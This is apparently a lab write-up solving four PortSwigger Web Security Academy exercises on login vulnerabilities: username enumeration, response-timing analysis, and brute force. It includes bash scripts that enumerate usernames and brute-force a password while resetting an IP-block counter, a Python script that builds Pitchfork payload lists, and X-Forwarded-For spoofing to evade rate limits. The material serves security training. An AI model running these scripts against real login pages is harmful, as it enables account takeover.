# Vulnerabilities in password-based login

## Lab: Username enumeration via different responses

 This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

- Candidate usernames
- Candidate passwords

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

The lab features the following login panel:

![image](https://github.com/user-attachments/assets/8b597411-b722-4965-9593-5e6e5ea5e05e)

We attempted to log in with test credentials:
![image](https://github.com/user-attachments/assets/e3129c73-ac3b-4142-b33d-63643ff746f6)

We perform fuzzing with `ffuf` using the `candidate_usernames.txt` wordlist provided by **PortSwigger**:  
![image](https://github.com/user-attachments/assets/3798bbce-e4ba-4fb3-a098-fa8b3db6f6d6)

Now that we have the username, we perform the login again with `cURL` to observe the behavior:
![image](https://github.com/user-attachments/assets/00faf889-916a-4195-9ee2-ac4f0a662914)

We make the request again with `ffuf`, now filtering "Incorrect password" using the `candidate_passwords.txt` wordlist:
![image](https://github.com/user-attachments/assets/7a96bbf0-b102-4106-b4f7-26e2cd420ebc)

We log in and complete the lab:
![image](https://github.com/user-attachments/assets/5bdb1043-84b8-4998-943b-4ca10775c9c7)

---

## Lab: Username enumeration via subtly different responses

 This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

- Candidate usernames
- Candidate passwords

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 

We made the request using `cURL`:
![image](https://github.com/user-attachments/assets/7d7cb48f-a367-4e11-99be-2af01de098ae)

We performed fuzzing with `ffuf`:
![image](https://github.com/user-attachments/assets/92663fd5-71d1-47f1-b19e-ef859092eec7)

We see that the user is **vagrant**.  

As an alternative, we try fuzzing again but filtering with a regex that exactly matches that string. We created a bash script:  
```bash
#!/bin/bash

WORDLIST="candidate_usernames.txt"

URL="https://0a5d00730450e252d7fd8d9d006400f4.web-security-academy.net/login"

HEADERS="Content-Type: application/x-www-form-urlencoded"

while read -r USER; do
    RESPONSE=$(curl -s -X POST "$URL" \
        -H "$HEADERS" \
        -d "username=$USER&password=test")

    if [[ "$RESPONSE" != *"Invalid username or password."* ]]; then
        echo "Posible usuario válido: $USER"
    fi
done < "$WORDLIST"
```


We run the script:  
![image](https://github.com/user-attachments/assets/361d0727-cd11-4583-8880-b7db34e9c7c4)

We could also have used BurpSuite's Intruder:  

First, we need to add the payload, include the wordlist, and in **settings** we need to configure the `GREP-EXTRACT` section:
![image](https://github.com/user-attachments/assets/a188d900-d951-4db7-9b24-40a3d29677ed)
![image](https://github.com/user-attachments/assets/da809777-e29d-41cb-be7c-6565cf0ae109)



Now that we have the **vagrant** user, we make a `cURL` request with a test password to observe the behavior:"
![image](https://github.com/user-attachments/assets/0b0e5995-aa3e-468c-b4ac-eb0c075adaa0)
We see that a '.' is missing at the end of the sentence. Now, we perform password fuzzing and filter **Invalid username or password**:  
![image](https://github.com/user-attachments/assets/3bae9716-68c4-4193-b2ff-fad2a13e83c7)

Now we log in with the credentials and solve the lab:
![image](https://github.com/user-attachments/assets/f22cc318-f15b-4e2d-80fc-98d05df8cca2)

---

## Lab: Username enumeration via response timing

This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

- Your credentials: wiener:peter
Wordlists:
- Candidate usernames
- Candidate passwords

Hint: To add to the challenge, the lab also implements a form of IP-based brute-force protection. However, this can be easily bypassed by manipulating HTTP request headers.

We make the request with `cURL` to observe the response:
![image](https://github.com/user-attachments/assets/4b0216ad-f410-43e4-8917-8c4f35f191d3)
After a few attempts, we get the message:
![image](https://github.com/user-attachments/assets/627286b2-98df-489e-a169-4204d6d6247f)

We send the request from Burp to the Intruder and configure a Pitchfork Attack, which performs parallel fuzzing with 2 payloads:
![image](https://github.com/user-attachments/assets/10a8ff49-fdae-48cc-ad68-3c91e49fa874)
We spoof the IP with the "X-Forwarded-For" header and fuzz the username. At the same time, in `Settings`, `Grep - Match`, we configure the negative filter for the response "Invalid username or password.":
![image](https://github.com/user-attachments/assets/4bceb7ad-ce4c-4885-95b0-1f4b191697f6)
**Note:** The X-Forwarded-For (XFF) header is an HTTP header used to identify the original IP address of a client that is behind a proxy server, load balancer, or another intermediate device. It is particularly useful in architectures where the client does not connect directly to the final server.  
**Limitations:**  
Unreliable if proxies are not secure:
 - If any intermediate device can modify the header, the information can be spoofed.
 - It is recommended to use it only in networks where proxies and load balancers are trusted.
   
We see that despite applying the filter, this time there is no visible difference:
![image](https://github.com/user-attachments/assets/25e1784d-c858-4ed1-9034-a8424f8a4c59)

When we test manually using Repeater with an incorrect username, the response is noticeably faster compared to when using a valid username and a significantly long password. This suggests that the server validates the username first and only proceeds to validate the password if the username is valid.
We proceed to check the difference in the response timing by performing the same attack, sending a large password (100 characters) using intruder:
![image](https://github.com/user-attachments/assets/6ebf0359-6729-4049-ab8d-2422d4bb6a8b)
We can see that the response with the username `amarillo` takes significantly longer than the other requests:
![image](https://github.com/user-attachments/assets/e64508d0-8ec5-4803-9dec-85bcbf1fca33)
We proceed to modify the payloads to perform a brute force attack with the passwords:
![image](https://github.com/user-attachments/assets/49bf4f60-2f68-4e3e-b0eb-8c50d49d0bc6)
![image](https://github.com/user-attachments/assets/da982241-62f1-435f-8730-f7587e3b29d6)

We proceed to log in and complete the lab:
![image](https://github.com/user-attachments/assets/4c88b9ba-d037-4366-958d-bbeecea53596)

---

## Lab: Broken brute-force protection, IP block

This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

- Your credentials: `wiener:peter`
- Victim's username: carlos
- Candidate passwords
  
Hint: Advanced users may want to solve this lab by using a macro or the Turbo Intruder extension. However, it is possible to solve the lab without using these advanced features.

We made a test request:
![image](https://github.com/user-attachments/assets/1ed07196-7f9b-4aa3-8ce7-69f8e11af98c)

On the fourth attempt, we see that the server blocks us:
![image](https://github.com/user-attachments/assets/3c6cb504-9e7a-4381-b2de-80e7d1af445f)
**Note:** We know that the IP is blocking us because when we try with our user, we are still blocked:  
![image](https://github.com/user-attachments/assets/8cb0294a-c78d-4632-8b23-ae7fa5870943)

We realize manually that we can reset the counter to 0 by logging in with our credentials before the server blocks us:
![image](https://github.com/user-attachments/assets/d1562628-de39-49bf-a63b-3df16764f112)

We created the following script that performs a password brute force attack, resetting the server's counter to zero whenever 2 failed login attempts are reached:
```bash
#!/bin/bash

url="https://0a40005e033f387d8000fdfe00aa000e.web-security-academy.net/login"
passwords=("123456" "password" "12345678" "qwerty" "123456789" "12345" "1234" "111111" "1234567" "dragon"
           "123123" "baseball" "abc123" "football" "monkey" "letmein" "shadow" "master" "666666" "qwertyuiop"
           "123321" "mustang" "1234567890" "michael" "654321" "superman" "1qaz2wsx" "7777777" "121212" "000000"
           "qazwsx" "123qwe" "killer" "trustno1" "jordan" "jennifer" "zxcvbnm" "asdfgh" "hunter" "buster"
           "soccer" "harley" "batman" "andrew" "tigger" "sunshine" "iloveyou" "2000" "charlie" "robert"
           "thomas" "hockey" "ranger" "daniel" "starwars" "klaster" "112233" "george" "computer" "michelle"
           "jessica" "pepper" "1111" "zxcvbn" "555555" "11111111" "131313" "freedom" "777777" "pass"
           "maggie" "159753" "aaaaaa" "ginger" "princess" "joshua" "cheese" "amanda" "summer" "love"
           "ashley" "nicole" "chelsea" "biteme" "matthew" "access" "yankees" "987654321" "dallas" "austin"
           "thunder" "taylor" "matrix" "mobilemail" "mom" "monitor" "monitoring" "montana" "moon" "moscow")
   
reset_username="wiener"
reset_password="peter"

fail_count=0

for ((i=0; i<${#passwords[@]}; i++)); do
  password="${passwords[i]}" 

 
  full_response=$(curl -s -X POST "$url" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=carlos&password=$password")

 
  if [[ ! "$full_response" =~ "Incorrect password" ]]; then
    echo "Successful login for password: $password"
  fi


  if [[ "$full_response" =~ "Incorrect password" ]]; then
    fail_count=$((fail_count + 1))
  else
    fail_count=0  
  fi

 
  if [[ $fail_count -ge 2 ]]; then
#    echo "Resetting IP block by logging in with valid credentials..."
    curl -s -X POST "$url" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "username=$reset_username&password=$reset_password" > /dev/null
  fi
done
```
We executed the script and obtained the password:
![image](https://github.com/user-attachments/assets/298304e6-0291-42b9-949b-3c8a14c7d835)

We could also have used a Burp Suite Pitchfork Attack by generating the lists (correct credentials every 2 incorrect ones). We will regenerate the lab and proceed to solve it this way.
```python
#!/usr/bin/env python3

print("------ Lista users -----")
for i in range(150):
    if i % 3 == 0 or i % 3 == 1:
        print("carlos")
    else:
        print("wiener")

with open('passwords.txt', 'r') as f:
    lines =  f.readlines()

print("------------------------------------------")
print("----- Lista passwords -----")

i = 0 

for passwd in lines:
    if i % 3 == 0 or i% 3 == 1:
        print(passwd.strip())
    else:
        print('peter')
    i += 1

```

We performed the Pitchfork Attack with Burp Suite Intruder, configuring both payloads with the generated lists:
![image](https://github.com/user-attachments/assets/20630434-b69d-4fdf-92c1-3dd86d40a363)

We log in and complete the lab:
![image](https://github.com/user-attachments/assets/74d0ab86-86dd-4238-a1ca-7b63b2569b87)

















